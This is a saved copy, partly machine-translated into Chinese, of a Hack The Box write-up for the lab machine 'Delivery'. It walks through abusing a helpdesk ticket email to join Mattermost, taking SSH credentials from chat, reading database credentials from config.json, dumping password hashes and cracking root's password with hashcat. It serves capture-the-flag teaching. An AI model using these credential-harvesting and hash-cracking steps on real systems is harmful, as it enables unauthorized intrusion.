该电子邮件注册一个Mattermost帐户，在那里我可以找到包含SSH信誉的内部对话
`/opt/mattermost/config/config.json` 下获得数据库账号 
数据库获得root
# 人力登陆器：交付

[0xdf.gitlab.io](https://0xdf.gitlab.io/2021/05/22/htb-delivery.html)0xdf黑客的东西

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fdelivery-cover.) 

交付是一个容易评级的盒子，我发现初学者非常友好。它不需要任何技术上复杂的内容，而是需要一些创造性思维。该框显示一个帮助台和一个“最物质”实例。通过在帮助台创建票证，我会收到一封电子邮件，可用于更新票证。我将使用该电子邮件注册一个Mattermost帐户，在那里我可以找到包含SSH信誉的内部对话。访问该框后，我将签出数据库并转储根密码哈希。使用Matter最重要聊天中提到的哈希猫规则，我将破解该密码，即框中的根密码。

## 箱子信息

名字

[交货](https://www.hackthebox.eu/home/machines/profile/308) ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Ficons%2Fbox-delivery.png) 

发行日期

[09 1月 2021](https://twitter.com/hackthebox_eu/status/1242495196643971079)

停用日期

22 五月 2021

操作系统

操作系统 ![](https://image.cubox.pro/article/2022091809192232808/86382.jpg) 

基本点

简易 \[20\]

额定难度

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fdelivery-diff.png) 

雷达图

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fdelivery-radar.png) 

 ![](https://image.cubox.pro/article/2022091809192294225/76393.jpg) 

42 分 52 秒[![信息安全杰克](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F52045)](https://www.hackthebox.eu/home/users/profile/52045)

 ![](https://image.cubox.pro/article/2022091809192276507/23214.jpg) 

44 分 25 秒[![科兰](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F183082)](https://www.hackthebox.eu/home/users/profile/183082)

造物主

[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F3769)](https://www.hackthebox.eu/home/users/profile/3769)-

## 侦察

### n地图

`nmap`在 8065 上找到了三个打开的 TCP 端口，即 SSH （22）、HTTP （80） 和看起来像第二个 HTTP 服务器的端口：

    oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.222
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-18 13:26 EDT
    Nmap scan report for delivery.htb (10.10.10.222)
    Host is up (0.020s latency).
    Not shown: 65532 closed ports
    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    8065/tcp open  unknown
    
    Nmap done: 1 IP address (1 host up) scanned in 11.38 seconds
    
    oxdf@parrot$ nmap -p 22,80,8065 -sC -sV -oA scans/nmap-tcpscans 10.10.10.222
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-18 13:31 EDT           
    Nmap scan report for delivery.htb (10.10.10.222)                          
    Host is up (0.019s latency).
    
    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)     
    | ssh-hostkey:
    |   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)            
    |   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)           
    |_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)         
    80/tcp   open  http    nginx 1.14.2
    |_http-server-header: nginx/1.14.2
    |_http-title: Welcome
    8065/tcp open  unknown
    | fingerprint-strings:
    |   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
    |     HTTP/1.1 400 Bad Request
    |     Content-Type: text/plain; charset=utf-8
    |     Connection: close
    |     Request
    |   GetRequest:
    |     HTTP/1.0 200 OK
    |     Accept-Ranges: bytes
    |     Cache-Control: no-cache, max-age=31556926, public
    |     Content-Length: 3108
    |     Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com
    |     Content-Type: text/html; charset=utf-8
    |     Last-Modified: Tue, 18 May 2021 17:27:40 GMT
    |     X-Frame-Options: SAMEORIGIN
    |     X-Request-Id: qmk1xu7ctbgdtdfomo36e7sixo
    |     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false
    |     Date: Tue, 18 May 2021 17:34:53 GMT
    |     <!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0"><meta name="robots" conten
    t="noindex, nofollow"><meta name="referrer" content="no-referrer"><title>Mattermost</title><meta name="mobile-web-app-capable" content="yes"><meta name="application-name" content="Mattermost
    "><meta name="format-detection" content="telephone=no"><link re
    |   HTTPOptions: 
    |     HTTP/1.0 405 Method Not Allowed
    |     Date: Tue, 18 May 2021 17:34:53 GMT
    |_    Content-Length: 0
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port8065-TCP:V=7.91%I=7%D=5/18%Time=60A3FA0C%P=x86_64-pc-linux-gnu%r(Ge
    ...[snip]...
    SF:);
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 91.38 seconds
    

Based on the [OpenSSH](https://packages.debian.org/search?keywords=openssh-server) version, the host is likely running Debian Buster (10). The HTTP scripts for TCP 8065 show the string “Mattermost”, so it could be an instance of that open source Slack alternative.

### Website - TCP 80

The site is not really for anything, but does mention checking out the helpdesk for email related support:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210106154413236.png) 

The link goes to . I’ll add both that subdomain and the base domain () to my local file.`helpdesk.delivery.htb``delivery.htb``/etc/hosts`

Clicking on the “Contact Us” link displays another window:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210106154548581.png) 

The HelpDesk link is the as the one above. The MatterMost server link is to , which explains the other port. There’s also some hint here as to the path. I need to get a email to get access to the MatterMost server.`helpdesk.htb:8065``@delivery.htb`

### helpdesk.delivery.htb - TCP 80

This is an instance of osTicket:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210106161636820.png) 

As a guest user, I can create a ticket:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210518150259572.png) 

And it will give me a page saying it’s been accepted:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210518150324085.png) 

The email to add to the ticket is interesting. I’ll note that.

The Sign In link has a form, as well as a registration link:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210518150408579.png) 

On clicking “Create an account” and filling out the form, it gives me a page that says a link has been sent to the email to activate it. On HTB, that’s basically a deadend. If I try to log in, it returns this error:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210518150544712.png) 

If I click the Check Ticket Status link, it asks for an email or ticket number. Because no validation was done of my email when submitting a ticket as a Guest User, I can enter that email and ticket number:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210518150752101.png) 

This page gives the current ticket, with the option to update it:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210518150837191.png) 

### delivery.htb - TCP 8065

The main page here is a login form:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210518151248957.png) 

The create account link leads to another form:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210518151629166.png) 

Submitting also leads to an email confirmation step:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210518151658316.png) 

Without an email address, not much I can do here.

## Shell as maildeliverer

### Access to MatterMost

The note above suggested that I needed a email address to get an account. It looks like it will work without one, but practically, I can’t receive emails at an outside account because HTB labs are not connected to the internet.`@delivery.htb`

I did note that when I created a ticket, it offered the ability to update the ticket over email. I can use that to get the verification email.

I’ll create a ticket and get the email address for it. Then sign up for a MatterMost account:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210106162055815.png) 

Back at HelpDesk, giving it the same email I originally gave (0xdf@0xdf.com) and the ticket number provides access to the ticket, which has the MatterMost confirmation email in it:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210106162333924.png) 

Visiting the link in the ticket verifies the account:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210106162356701.png) 

One logging in, there’s a chance to join a team:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210106162452740.png) 

On joining that team, there’s a single channel, with some chat from root:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210106162655389.png) 

I’ll note creds for the account maildeliverer, as well as a hint that a lot of the passwords on the box are variants of “PleaseSubscribe!”, and a note about how Hashcat rules will find the variants.

### SSH

Those creds do work to SSH to the box:

    oxdf@parrot$ sshpass -p 'Youve_G0t_Mail!' ssh maildeliverer@10.10.10.222
    Warning: Permanently added '10.10.10.222' (ECDSA) to the list of known hosts.
    Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64
    
    The programs included with the Debian GNU/Linux system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.
    
    Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
    permitted by applicable law.
    Last login: Tue Jan  5 06:09:50 2021 from 10.10.14.5
    

And grab :`user.txt`

    maildeliverer@Delivery:~$ cat user.txt
    6b22a6ae************************
    

## Shell as root

### Enumeration

#### MM Config

Mattermost stores it’s configuration in . The database connection information is in here:`/opt/mattermost/config/config.json`

    maildeliverer@Delivery:/opt/mattermost/config$ cat config.json 
    ...[snip]...
        "SqlSettings": {
            "DriverName": "mysql",
            "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
            "DataSourceReplicas": [],
            "DataSourceSearchReplicas": [],
            "MaxIdleConns": 20,
            "ConnMaxLifetimeMilliseconds": 3600000, 
            "MaxOpenConns": 300,
            "Trace": false,
            "AtRestEncryptKey": "n5uax3d4f919obtsp1pw1k5xetq1enez",
            "QueryTimeout": 30,
            "DisableDatabaseSearch": false
        },    
    ...[snip]...
    

The database password is there, along with a hint as to where to go next.

#### SQL

I’ll connect to the DB with the creds in the config above:

    maildeliverer@Delivery:/opt/mattermost/config$ mysql -u mmuser -pCrack_The_MM_Admin_PW mattermost
    Reading table information for completion of table and column names
    You can turn off this feature to get a quicker startup with -A
                                                              
    Welcome to the MariaDB monitor.  Commands end with ; or \g.
    Your MariaDB connection id is 98
    Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10
                                                              
    Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
                                                              
    Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
                                                              
    MariaDB [mattermost]>
    

There’s only the default DB and mattermost:

    MariaDB [mattermost]> show databases;
    +--------------------+
    | Database           |
    +--------------------+
    | information_schema |
    | mattermost         |
    +--------------------+
    2 rows in set (0.000 sec)
    

I can see from the prompt that I’m already using the mattermost db, but if I needed to switch, would do that. The mattermost database has a lot of tables:`use mattermost`

    MariaDB [mattermost]> show tables;
    +------------------------+
    | Tables_in_mattermost   |
    +------------------------+
    | Audits                 |
    | Bots                   |
    ...[snip]...
    | UploadSessions         |
    | UserAccessTokens       |
    | UserGroups             |
    | UserTermsOfService     |
    | Users                  |
    +------------------------+
    46 rows in set (0.001 sec)
    

I’ll start with the table:`users`

    MariaDB [mattermost]> select Username,Password from Users;
    +----------------------------------+--------------------------------------------------------------+
    | Username                         | Password                                                     |
    +----------------------------------+--------------------------------------------------------------+
    | qqqq                             | $2a$10$5B3h2oM/j0qeugNf9/MwV.nYW1uBCNBnQrJr8kS0iDBuINB4mu1HC |
    | surveybot                        |                                                              |
    | c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |
    | 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |
    | root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
    | oxdfa                            | $2a$10$W.i4QH1wBaxqKAUipiFkbOlVUAXWjwyuzIQuPi8T.tFqxeg28kUj2 |
    | ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |
    | channelexport                    |                                                              |
    | 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |
    | oxdf                             | $2a$10$EA7sQu.R9OSOvLUUb/kWvetfiqKJfcn1Pzvj3xvYFZgK5Q1YJ8WyK |
    +----------------------------------+--------------------------------------------------------------+
    

A lot of those look like other users or me. I’ll focus on the root user.

### Crack Password

I’ll drop the hash into a file:

    root@kali# cat hash 
    root:$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO
    

Based on the comments from Mattermost, I’ll create a file with the password:

    oxdf@parrot$ cat password 
    PleaseSubscribe!
    

Now I can run with a rule file to get different variations on the passwords in the file (just one in this case). There are many in , but why not start with the one called “best”:`/usr/share/hashcat/rules`

    root@kali# hashcat -m 3200 hash password --user -r /usr/share/hashcat/rules/best64.rule 
    ...[snip]...
    $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21
    

It cracks pretty quickly.

### su

That password works for the root account on Delivery:

    maildeliverer@Delivery:/$ su -
    Password: 
    root@Delivery:~#
    

I can grab :`root.txt`

    root@Delivery:~# cat root.txt
    b3bc48d7************************
    

[查看原网页: 0xdf.gitlab.io](https://0xdf.gitlab.io/2021/05/22/htb-delivery.html)